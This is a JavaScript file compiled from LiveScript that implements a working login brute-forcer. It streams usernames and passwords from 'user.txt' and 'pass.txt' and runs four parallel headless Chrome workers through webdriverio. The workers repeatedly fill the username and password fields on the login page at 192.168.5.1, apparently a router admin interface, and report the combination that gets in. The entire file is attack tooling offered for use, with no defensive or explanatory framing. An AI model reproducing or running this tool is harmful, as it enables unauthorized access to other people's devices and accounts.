// Generated by LiveScript 1.4.0
(function(){
  var fs, path, colors, webdriverio, events, p, h, _, options, Reader, BruteForcer, bruteForcer, loopy, bf, workerN, spawnWorker;
  fs = require('fs');
  path = require('path');
  colors = require('colors');
  webdriverio = require('webdriverio');
  events = require('events');
  p = require('bluebird');
  h = require('helpers');
  _ = require('underscore');
  options = {
    desiredCapabilities: {
      browserName: 'chrome'
    }
  };
  Reader = (function(superclass){
    var prototype = extend$((import$(Reader, superclass).displayName = 'Reader', Reader), superclass).prototype, constructor = Reader;
    function Reader(filePath, options){
      var defaults;
      defaults = {
        loop: false
      };
      this.options = _.extend(defaults, options);
      this._filePath = path.normalize(filePath);
      this._lines = [];
      this._requests = [];
      this.makeReadStream();
    }
    prototype.makeReadStream = function(){
      var this$ = this;
      this._fragment = "";
      this._stream = fs.createReadStream(this._filePath);
      this._stream.on('error', function(it){
        throw it;
      });
      this._stream.on('data', function(data){
        this$._stream.pause();
        data = String(data).split(/(?:\n|\r\n|\r)/g);
        data[0] = this$._fragment + data[0];
        if (data.length > 0) {
          this$._fragment = data.pop();
        } else {
          this$._fragment = "";
        }
        this$._lines = this$._lines.concat(data);
        if (this$._lines.length) {
          this$._stream.pause();
          return this$.emit('push');
        }
      });
      return this._stream.on('end', function(){
        this$._stream.removeAllListeners();
        if (this$.options.loop) {
          this$.makeReadStream();
          this$.emit('loop');
          return this$.emit('end');
        } else {
          this$.emit('end');
          return _.map(this$._requests, function(it){
            return it.reject(new Error("reached the end of " + this$._filePath));
          });
        }
      });
    };
    prototype.work = function(){
      var shift, this$ = this;
      this._working = true;
      if (this._stream.isPaused()) {
        this._stream.resume();
      }
      shift = function(){
        this$._requests.shift().resolve(this$._lines.shift());
        if (this$._requests.length) {
          return this$.work();
        } else {
          return this$._working = false;
        }
      };
      if (this._lines.length) {
        return shift();
      } else {
        return this.once('push', shift);
      }
    };
    prototype.next = function(){
      var this$ = this;
      return new p(function(resolve, reject){
        if (this$._lines.length) {
          return resolve(this$._lines.shift());
        } else {
          this$._requests.push({
            resolve: resolve,
            reject: reject
          });
          if (!this$._working) {
            return this$.work();
          }
        }
      });
    };
    return Reader;
  }(events.EventEmitter));
  BruteForcer = (function(){
    BruteForcer.displayName = 'BruteForcer';
    var prototype = BruteForcer.prototype, constructor = BruteForcer;
    function BruteForcer(userList, passList){
      var this$ = this;
      this.userList = userList;
      this.passList = passList;
      this.ur = new Reader(this.userList);
      this.pr = new Reader(this.passList, {
        loop: true
      });
      this.pr.on('loop', function(){
        return this$.user = void 8;
      });
      this.requests = [];
    }
    prototype.getUser = function(){
      var this$ = this;
      return new p(function(resolve, reject){
        if (this$.user) {
          return resolve(this$.user);
        } else {
          return this$.ur.next().then(function(it){
            return resolve(this$.user = it);
          });
        }
      });
    };
    prototype.getPass = function(){
      return this.pr.next();
    };
    prototype.next = function(){
      var this$ = this;
      return new p(function(resolve, reject){
        return p.all([this$.getUser(), this$.getPass()]).then(function(it){
          return resolve({
            user: it[0],
            pass: it[1]
          });
        });
      });
    };
    return BruteForcer;
  }());
  bruteForcer = new BruteForcer('user.txt', 'pass.txt');
  loopy = function(){
    return bruteForcer.next().then(function(it){
      console.log(it);
      return loopy();
    });
  };
  loopy();
  bf = function(page){
    return page.timeoutsImplicitWait(500).bruteforce(bruteForcer).then(function(it){
      return console.log("PASS", it);
    }, function(err){
      return console.log("FAIL", err);
    });
  };
  workerN = 0;
  spawnWorker = function(){
    var n, page;
    n = workerN++;
    page = webdriverio.remote(options).init();
    page.addCommand("bruteforce", function(bruteForcer){
      var loopy, this$ = this;
      loopy = function(){
        return bruteForcer.next().then(function(login){
          console.log("trying " + login.user + ":" + login.pass);
          return this$.waitForExist('.username', 3000).setValue('.username', login.user).setValue('.password', login.pass).click('.login').waitForExist('#myLayer', 3000).then(loopy, function(){
            return console.log(colors.green("Worker " + n + " finished with combo " + login.user + " " + login.pass));
          });
        });
      };
      return loopy();
    });
    page.timeoutsImplicitWait(200).url('http://192.168.5.1').title(function(err, res){
      return console.log('title: ' + res.value);
    });
    return bf(page);
  };
  _.times(4, spawnWorker);
  function extend$(sub, sup){
    function fun(){} fun.prototype = (sub.superclass = sup).prototype;
    (sub.prototype = new fun).constructor = sub;
    if (typeof sup.extended == 'function') sup.extended(sub);
    return sub;
  }
  function import$(obj, src){
    var own = {}.hasOwnProperty;
    for (var key in src) if (own.call(src, key)) obj[key] = src[key];
    return obj;
  }
}).call(this);
